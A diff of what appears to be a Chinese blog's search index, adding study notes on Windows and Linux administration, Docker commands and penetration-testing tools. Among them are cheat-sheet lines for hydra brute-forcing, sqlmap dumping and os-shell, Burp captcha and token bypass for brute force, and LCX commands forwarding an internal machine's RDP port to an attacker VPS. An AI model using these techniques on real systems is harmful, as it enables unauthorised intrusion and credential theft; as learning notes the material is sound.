 <p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620085404755.png" alt="image-20230620085404755" style="zoom:50%;"></p>
 </li>
-<li><p>regdit：注册表</p>
+<li><p>regedit：注册表</p>
 <p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620090028078.png" alt="image-20230620090028078" style="zoom:67%;"></p>
 </li>
 <li><p>gpedit.msc：组策略</p>
@@ -929,8 +1802,10 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </ul>
 <p>gpmc.msc：域策略<br><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091508483.png" alt="image-20230620091508483" style="zoom:67%;"></p>
 <p>wf.msc：防火墙设置<img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091637372.png" alt="image-20230620091637372"></p>
-<h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>gpupdate /force：强制刷新策略</p>
-<h3 id="常见知识点"><a href="#常见知识点" class="headerlink" title="常见知识点"></a>常见知识点</h3><h4 id="日志备份"><a href="#日志备份" class="headerlink" title="日志备份"></a>日志备份</h4><p>创新一个空文件，可以看到属性是A，模拟备份ttt文件后，A标记被去除表示文件已备份，修改文件后重新出现A标记<br><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091922400.png" alt="image-20230620091922400" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092235668.png" alt="image-20230620092235668" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092326731.png" alt="image-20230620092326731" style="zoom:50%;"></p>
+<p>services.msc：服务</p>
+<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><p>gpupdate /force：强制刷新策略</p>
+<p>whoami：查看计算机名d</p>
+<h2 id="常见知识点"><a href="#常见知识点" class="headerlink" title="常见知识点"></a>常见知识点</h2><h3 id="日志备份"><a href="#日志备份" class="headerlink" title="日志备份"></a>日志备份</h3><p>创新一个空文件，可以看到属性是A，模拟备份ttt文件后，A标记被去除表示文件已备份，修改文件后重新出现A标记<br><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620091922400.png" alt="image-20230620091922400" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092235668.png" alt="image-20230620092235668" style="zoom:50%;"><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092326731.png" alt="image-20230620092326731" style="zoom:50%;"></p>
 <p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230620092409811.png" alt></p>
 <p>日志备份原理：遍历需要备份的文件，查看文件属性是否是A，是A则进行备份后完成将属性转化成N，即进行差异备份</p>
 <p>事件查看器</p>
@@ -938,11 +1813,17 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p>NFTS权限</p>
 <p>访问控制与访问控制列表</p>
 <p>隐藏账户处置</p>
-<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h3><ul>
+<p>自动登录</p>
+<p>cmd+r：Control Userpasswords2</p>
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sudo groupadd <span class="selector-attr">[group]</span></span><br><span class="line">sudo gpasswd -<span class="selector-tag">a</span> <span class="variable">$USER</span> <span class="selector-attr">[group]</span></span><br><span class="line">newgrp <span class="selector-attr">[group]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">列出软件：apt list <span class="selector-attr">[]</span></span><br><span class="line">查看依赖项：apt depengs <span class="selector-attr">[]</span></span><br><span class="line">安装软件：apt install -y <span class="selector-attr">[]</span></span><br><span class="line">卸载软件：apt autoremove <span class="selector-attr">[]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">启动服务：systemctl start <span class="selector-attr">[]</span></span><br><span class="line">查看服务状态：systemctl status <span class="selector-attr">[]</span></span><br><span class="line">开机时启动服务：systemctl enable <span class="selector-attr">[]</span></span><br><span class="line">重启服务：systemctl restart <span class="selector-attr">[]</span></span><br><span class="line">结束服务：systemctl stop<span class="selector-attr">[]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> [options] <span class="built_in">source</span> dest</span><br><span class="line">	-b：目标文件或目录存在时，执行覆盖前会创建一个备份</span><br><span class="line">	-f：强制覆盖，不询问</span><br><span class="line">	-i：如果指定移动的源文件或目录与目标文件或目录同名，会询问</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> [options]</span><br><span class="line"></span><br><span class="line"><span class="built_in">touch</span>：创建文件</span><br></pre></td></tr></table></figure>
+<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h2 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h2><ul>
 <li>修改url参数，比如改成大写，正常的是windows，不正常的是linux</li>
 <li>使用ping命令，linux返回的TTL值一般比windows的值小一些，一般以100为划分线</li>
 </ul>
-<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><div class="table-container">
+<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -990,7 +1871,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </tbody>
 </table>
 </div>
-<h2 id="常用工具-1"><a href="#常用工具-1" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h4 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h4><div class="table-container">
+<h1 id="常用工具-1"><a href="#常用工具-1" class="headerlink" title="常用工具"></a>常用工具</h1><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h3><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1025,7 +1906,111 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </tbody>
 </table>
 </div>
+<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>共享文件夹</p>
+<p>linux虚拟机：/mnt/hgfs<br>windows虚拟机：\\vmware-host\Shared Folders\共享文件夹名称</p>
+<h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><p>web漏扫工具</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">常规扫描 nikto -h<span class="regexp">/-host url/i</span>p</span><br><span class="line">指定端口 -p</span><br><span class="line">指定协议 -&lt;协议&gt; eg:-ssl</span><br><span class="line">指定目录 -c</span><br><span class="line">多目标扫描 写入文本中，通过 -host 文本名</span><br><span class="line">绕过IDS检测 -evasion</span><br><span class="line">扫描结果输出 -F csv<span class="regexp">/htm/</span>txt<span class="regexp">/xml/m</span>sf+</span><br></pre></td></tr></table></figure>
+<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><p>web内容扫描程序。查找现有和隐藏的web对象。基本上是通过对web服务器发起基于字典的攻击并分析响应来工作的。</p>
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">端口扫描：nmap <span class="attr">--min-rate</span> <span class="number">10000</span> -<span class="selector-tag">p</span>- ip</span><br><span class="line">TCP：-sT</span><br><span class="line">UDP：-sU</span><br><span class="line">服务扫描：</span><br></pre></td></tr></table></figure>
+<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>AFP，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。</p>
+<p>对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等。</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">语法：hydra 参数 IP 服务</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line"><span class="deletion">-l login 小写，指定用户名进行破解</span></span><br><span class="line"><span class="deletion">-L file 大写，指定用户的用户名字典</span></span><br><span class="line"><span class="deletion">-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。</span></span><br><span class="line"><span class="deletion">-P file 大写，用于指定密码字典。</span></span><br><span class="line"><span class="deletion">-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</span></span><br><span class="line"><span class="deletion">-M file 指定目标ip列表文件，批量破解。</span></span><br><span class="line"><span class="deletion">-o file 指定结果输出文件</span></span><br></pre></td></tr></table></figure>
+<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">基础搜索：searchsploit &lt;搜索目标&gt;    范围：标题和路径</span><br><span class="line">-t 范围：标题</span><br><span class="line">-<span class="selector-tag">p</span> 漏洞编号，如-<span class="selector-tag">p</span> <span class="number">37292</span><span class="selector-class">.c</span>,会返还漏洞的url、本地路径等信息</span><br><span class="line"><span class="attr">--exclude</span>=<span class="string">&quot;过滤内容&quot;</span>  eg：<span class="attr">--excluded</span>=<span class="string">&quot;(PoC)|/dos/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h2><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h4><p>将截获的数据包进行重放，达到身份认证等目的</p>
+<h4 id="前端验证码验证"><a href="#前端验证码验证" class="headerlink" title="前端验证码验证"></a>前端验证码验证</h4><p>验证码在js中，不会经过后台验证，只进行前端验证。<br>bp运行在浏览器和目标服务器之间的代理，可以直接越过验证码。</p>
+<h4 id="后端验证码绕过"><a href="#后端验证码绕过" class="headerlink" title="后端验证码绕过"></a>后端验证码绕过</h4><p>后端验证码刷新需要条件触发，验证码刷新存放在另一个文件中，bp对网址的登陆的请求数据包进行抓取，从而使得只执行登陆页面的数据包，不会点击登录按钮从而不会触发验证码刷新，从而一直运用一个正确的验证码就能够进行爆破</p>
+<h4 id="前端token验证"><a href="#前端token验证" class="headerlink" title="前端token验证"></a>前端token验证</h4><p>程序返回一个签名的token给客户端，客户端存储token并且用于每次发送请求，服务端验证token并返回数据。</p>
+<p>token验证存放在前端，可以运用正则表达式对token进行一个抓取，把爆破线程设置为1，从而能够实现刷新、抓取token、验证用户账户</p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-u [url]：指定url</span></span><br><span class="line"><span class="deletion">-data &quot;注入点&quot;：指定注入点</span></span><br><span class="line"><span class="deletion">-D：指定数据库</span></span><br><span class="line"><span class="deletion">-T：指定表</span></span><br><span class="line"><span class="deletion">-C：指定字段id</span></span><br><span class="line"><span class="deletion">-file-write：读取文件</span></span><br><span class="line"><span class="deletion">-file-dest：存放文件的位置</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="comment">--dbs：列出数据库</span></span><br><span class="line"><span class="comment">--tables：列出表</span></span><br><span class="line"><span class="comment">--columns：列出字段</span></span><br><span class="line"><span class="comment">--dump：获取字段中的数据</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">--os-<span class="built_in">shell</span>:sqlmap直连反弹<span class="built_in">shell</span></span><br><span class="line">--sql-<span class="built_in">shell</span>：连接sqlshell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="natcat"><a href="#natcat" class="headerlink" title="natcat"></a>natcat</h2><p>监听某个端口</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">nc <span class="selector-attr">[options]</span> port</span><br></pre></td></tr></table></figure>
+<h2 id="findWebshell"><a href="#findWebshell" class="headerlink" title="findWebshell"></a>findWebshell</h2><h1 id="GET和POST区别"><a href="#GET和POST区别" class="headerlink" title="GET和POST区别"></a>GET和POST区别</h1><ol>
+<li>GET会把请求数据放在url上并且以？分割url和传输的数据，参数之间以&amp;连接，所以GET不太安全。<br>POST会把数据放在HTTP数据包里面(request body)</li>
+<li>GET获取数据；POST修改数据</li>
+<li>GET提交的数据最大时2K，实际上的限制取决于浏览器；POST理论上没有限制</li>
+<li>GET产生一个TCP数据包，浏览器会把http header和data一起发出，服务器响应200；POST会产生两个TCP数据包，浏览器先发送header，服务器响应100（contine），浏览器在发送data，服务器响应200 OK，在返回数据</li>
+<li>GET请求会被浏览器主动缓存；POST不会，除非主动设置</li>
+</ol>
+<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>情景：拿到一个待检测的站，该如何渗透</p>
+<ol>
+<li>信息收集<ul>
+<li>服务器相关信息<pre><code>真实ip、系统类型、版本、开放的端口等
+</code></pre></li>
+<li>网站指纹<pre><code>cms、cdn、证书、dns记录
+</code></pre></li>
+<li>whois信息<pre><code>姓名、备案、邮箱、电话
+</code></pre></li>
+<li>子域名收集、旁站、C段</li>
+<li>google hacking</li>
+<li>扫描网站目录结构，爆破后台，敏感信息</li>
+</ul>
+</li>
+<li>漏洞测试<ul>
+<li>sql注入、文件上传、命令执行、xss、xxe、文件包含等</li>
+</ul>
+</li>
+<li>漏洞利用<ul>
+<li>getshell</li>
+</ul>
+</li>
+<li>提权</li>
+<li>权限维持</li>
+<li>内网扫描</li>
+<li>内网攻击</li>
+<li>痕迹清理</li>
+<li>总结报告以及修复方案</li>
+</ol>
+<h2 id="IPS和IDS的区别"><a href="#IPS和IDS的区别" class="headerlink" title="IPS和IDS的区别"></a>IPS和IDS的区别</h2><p>IPS：入侵防御系统，是对防病毒软件和防火墙的补充，位于防火墙和网络的设备之间的设备，即网络边界。如果检测到攻击，IPS会在攻击扩散到网络的其他地方之前组织这个恶意通信。因此IPS具有检测已知和未知攻击并具有成功防止攻击的能力。</p>
+<p>IDS：入侵检测系统，核心价值在于通过对全网信息的分析，了解信息系统的安全状况，进而指导信息系统安全建设目标以及安全策略的确立和调整。IDS系统需要部署在网络内部，监控范围可以覆盖整个子网。IDS的局限性是不能反击网络攻击，因为IDS传感器基于数据包嗅探技术。IDS不具备检测已知和未知攻击并具有成功防止攻击的能力。</p>
+<h1 id="建立通信隧道"><a href="#建立通信隧道" class="headerlink" title="建立通信隧道"></a>建立通信隧道</h1><p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230627184211121.png" alt="image-20230627184211121"></p>
+<p>攻击者找到合适的口子后，便可以将这个点作为从外网进入内网的根据地，此时可以在这个点上建立隧道，形成从外网到内网的跳板</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>又被叫做隧道，端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为。</p>
+<h2 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h2><p>windows:lcx.exe        linux:protmap</p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>将内网靶机的3389端口转发到边界机8888端口：lcx.exe -tran 8888 靶机ip 3389<br>场景：由于防火墙限制，只允许8888入站。</p>
+<p><img src="/2023/06/10/%E4%BF%A1%E5%AE%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20230627184750706.png" alt="image-20230627184750706"></p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>将内网靶机的3389端口转发到攻击机的8888端口</p>
+<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">攻击机(vps):lcx.exe -listen <span class="number">6666 8888</span></span><br><span class="line">边界机：lcx.exe -slave <span class="number">192.168.7.144</span> <span class="number">6666 192.168</span>.<span class="number">11.12 3389</span></span><br></pre></td></tr></table></figure>
+<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><h3 id="FTP匿名登陆"><a href="#FTP匿名登陆" class="headerlink" title="FTP匿名登陆"></a>FTP匿名登陆</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>anonymous</td>
+<td>Email，空</td>
+</tr>
+<tr>
+<td>FTP</td>
+<td>FTP，空</td>
+</tr>
+<tr>
+<td>USER</td>
+<td>pass</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>使用方式为：ftp url或ip，连接成功会提示用户输入账号密码</p>
+<h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>ascii：切换输出模式为文字模式<br>binary：切换传输模式为二进制模式<br>type：更改或显示目前传输模式</p>
+<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h2 id="MSTSC"><a href="#MSTSC" class="headerlink" title="MSTSC"></a>MSTSC</h2><h3 id="3389无法连接"><a href="#3389无法连接" class="headerlink" title="3389无法连接"></a>3389无法连接</h3><p>3389是远程桌面连接默认端口。连接不上的原因：</p>
+<ol>
+<li>防护软件拦截了不安全的连接</li>
+<li>修改了端口</li>
+<li>处于内网之中，可以用LCX远程连接</li>
+<li>没有开放3389或者说没有开放远程服务</li>
+<li>tcp/ip筛选限制登陆</li>
+</ol>
+<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-1：MD5加密方式</span></span><br><span class="line"><span class="deletion">-salt：指定salt值，不使用随机产生的salt。</span></span><br></pre></td></tr></table></figure>
 ]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
   </entry>
   <entry>
     <title>julia构建区块链</title>
@@ -1584,10 +2569,54 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 </ol>
 <p><img src="/2023/02/26/docker/image-20230226125320615.png" alt="image-20230226125320615"></p>
 <p>Docker的整个运行逻辑如这个图所示，通过Docker Client将需要执行的Docker命令发送给Docker运行的节点上的Docker daemon，Docker daemon将我们的请求进行分解执行，例如我们执行Docker build命令它会根据Dockerfile构建一个镜像存放于本地，执行Docker pull命令会从远端的容器镜像仓库拉取镜像到本地，执行Docker run命令会将容器镜像拉取并运行成为容器实例。</p>
-<p>型的linux启动到运行需要2个FS，一个是rootfs，一个是bootfs。bootfs是linux启动时进行加载的，会安装系统所使用的kernel内核，创建完成后bootfs会进行解绑。rootfs是我们真正去使用linux是操作的系统文件系统，包含/dev /bin等目录，对于我们构建容器镜像来说，我们利用rootfs作为我们的基础镜像来使用，一个精简的os来说，它的rootfs可以很小，只需要包括基本的命令和工具即可，例如alpine只有不到10MB。镜像构建基于一个基础镜像将我们需要进行安装的依赖和程序根据Dockerfile编写逐层叠加到镜像中，这里涉及到了一个容器镜像的概念就是，<strong>镜像分层</strong>，镜像的每一层都会有一个独立的id，Docker使用Union FS对Docker镜像进行分层和合层记录，当我们使用同一个基础镜像时，利用Docker镜像分层的功能可以帮助我们使用到已有的镜像层，拉取没有的镜像层，达到镜像的资源共享，减少重复镜像层拉取，达到资源使用最大化。容器运行时会在容器镜像最上层生成一个Container层，这个层是copy这个完整的镜像加载到内存中运行，在这个层级中对于容器来说是可以进行修改的，但是由于运行于内存中，我们对Container层的任何修改都不会对底层镜像生效，当容器消亡时我们修改的数据也一并消亡，这就是容器的<strong>copy on write</strong>特性。</p>
+<p>linux启动到运行需要2个FS，一个是rootfs，一个是bootfs。bootfs是linux启动时进行加载的，会安装系统所使用的kernel内核，创建完成后bootfs会进行解绑。rootfs是我们真正去使用linux是操作的系统文件系统，包含/dev /bin等目录，对于我们构建容器镜像来说，我们利用rootfs作为我们的基础镜像来使用，一个精简的os来说，它的rootfs可以很小，只需要包括基本的命令和工具即可，例如alpine只有不到10MB。镜像构建基于一个基础镜像将我们需要进行安装的依赖和程序根据Dockerfile编写逐层叠加到镜像中，这里涉及到了一个容器镜像的概念就是，<strong>镜像分层</strong>，镜像的每一层都会有一个独立的id，Docker使用Union FS对Docker镜像进行分层和合层记录，当我们使用同一个基础镜像时，利用Docker镜像分层的功能可以帮助我们使用到已有的镜像层，拉取没有的镜像层，达到镜像的资源共享，减少重复镜像层拉取，达到资源使用最大化。容器运行时会在容器镜像最上层生成一个Container层，这个层是copy这个完整的镜像加载到内存中运行，在这个层级中对于容器来说是可以进行修改的，但是由于运行于内存中，我们对Container层的任何修改都不会对底层镜像生效，当容器消亡时我们修改的数据也一并消亡，这就是容器的<strong>copy on write</strong>特性。</p>
+<h2 id="Docker前置知识"><a href="#Docker前置知识" class="headerlink" title="Docker前置知识"></a>Docker前置知识</h2><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h3><p><img src="/2023/02/26/docker/image-20230629232111696.png" alt="image-20230629232111696"><br><img src="/2023/02/26/docker/image-20230629232137908.png" alt="image-20230629232137908"><br><img src="/2023/02/26/docker/image-20230629232200542.png" alt="image-20230629232200542"></p>
+<p>可以看到镜像名为ubuntu:20:04，镜像id为626a42…，容器id为5f604…，所属仓库名为ubuntu</p>
+<h3 id="交互式-it"><a href="#交互式-it" class="headerlink" title="交互式(-it)"></a>交互式(-it)</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -it ubuntu:<span class="number">20</span>.<span class="number">04</span> /bin/bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230629232524397.png" alt="image-20230629232524397"></p>
+<h3 id="后台模式-d"><a href="#后台模式-d" class="headerlink" title="后台模式(-d)"></a>后台模式(-d)</h3><p><img src="/2023/02/26/docker/image-20230629233107503.png" alt="image-20230629233107503"></p>
+<h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><p><img src="/2023/02/26/docker/image-20230629233218749.png" alt="image-20230629233218749"></p>
+<p>或</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">docker stop amazing_cori</span><br></pre></td></tr></table></figure>
 <h2 id="Dockerfile的编写"><a href="#Dockerfile的编写" class="headerlink" title="Dockerfile的编写"></a>Dockerfile的编写</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="keyword">FROM</span> uhub.service.ucloud.cn/hello/maven:<span class="number">3</span>-jdk-<span class="number">8</span>-alpine</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr/src/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> target /usr/src/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> lib/jmx_prometheus_javaagent-0.12.0.jar /usr/src/app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> yaml/javaagent.yaml /usr/src/app</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">ENV</span> PORT <span class="number">8080</span></span><br><span class="line"><span class="keyword">EXPOSE</span> $PORT</span><br><span class="line"><span class="keyword">ENV</span> JMXPORT <span class="number">9090</span></span><br><span class="line"><span class="keyword">EXPOSE</span> $JMXPORT</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;java -javaagent:jmx_prometheus_javaagent-0.12.0.jar=<span class="variable">$&#123;JMXPORT&#125;</span>:javaagent.yaml -jar /usr/src/app/demo-0.0.1-SNAPSHOT.jar -Dserver.port=<span class="variable">$&#123;PORT&#125;</span> --spring.config.location=/etc/appconfig/hello.properties&quot;</span> ]</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 <p><strong>· FROM</strong> 我们基于什么镜像构建<br><strong>· WORKDIR</strong> 容器的工作目录<br><strong>· RUN</strong> 执行容器构建过程中的命令<br><strong>· CMD &amp; ENTRYPOINT</strong> 执行容器启动后的命令<br><strong>· ADD &amp; COPY</strong> 添加指定的文件到容器镜像中<br><strong>· ENV</strong> 设置环境变量<br><strong>· EXPOSE</strong> 设置容器暴露的端口</p>
-]]></content>
+<h2 id="Docker命令执行"><a href="#Docker命令执行" class="headerlink" title="Docker命令执行"></a>Docker命令执行</h2><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line">搜索镜像：docker serach [<span class="keyword">target</span>]</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230629223026232.png" alt="image-20230629223026232"></p>
+<p><img src="/2023/02/26/docker/image-20230629223049377.png" alt="image-20230629223049377"></p>
+<p>① NAME：镜像仓库名称。<br>② DESCRIPTION：镜像仓库描述。<br>③ STARS：镜像仓库收藏数，表示该镜像仓库的受欢迎程度，类似于GitHub的Stars。<br>④ OFFICAL：表示是否为官方仓库，该列标记为[OK]的镜像均由各软件的官方项目组创建和维护。由结果可知，java这个镜像仓库是官方仓库，而其他的仓库都不是镜像仓库。<br>⑤ AUTOMATED：表示是否是自动构建的镜像仓库。</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">下载镜像：docker pull [options] name[<span class="symbol">:tag|</span><span class="variable">@digest</span>]</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230629223419831.png" alt="image-20230629223419831"></p>
+<p><img src="/2023/02/26/docker/image-20230629223606003.png" alt="image-20230629223606003"></p>
+<p>默认情况下从docker hub拉取镜像，但也可以指定，比如从</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">docker pull myregistry.loca<span class="variable">l:8000</span>/<span class="keyword">python</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">列出镜像：docker images</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230629224545169.png" alt="image-20230629224545169"></p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">docker images --<span class="built_in">filter</span> <span class="string">&quot;dangling=true&quot;</span></span><br></pre></td></tr></table></figure>
+<p>① REPOSITORY：镜像所属仓库名称。<br>② TAG：镜像标签。默认是latest，表示最新。<br>③ IMAGE ID：镜像ID，表示镜像唯一标识。<br>④ CREATED：镜像创建时间。<br>⑤ SIZE：镜像大小</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">删除镜像：docker rmi [options] image [image]</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230629224712227.png" alt="image-20230629224712227"></p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">docker rmi hello-world</span><br><span class="line">删除所有镜像：</span><br><span class="line">docker rmi -f <span class="constructor">$(<span class="params">docker</span> <span class="params">images</span>)</span>]</span><br><span class="line">删除所有处于终止状态的容器</span><br><span class="line">docker container prune</span><br></pre></td></tr></table></figure>
+<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">保存镜像：docker <span class="keyword">save</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">docker <span class="keyword">save</span> blog &gt;blog.tar</span><br><span class="line">docker <span class="keyword">save</span> --<span class="keyword">output</span> blog.tar blog</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">获取详细信息：docker inspect [image]</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">列出各个层的创建信息：docker history [image]</span><br></pre></td></tr></table></figure>
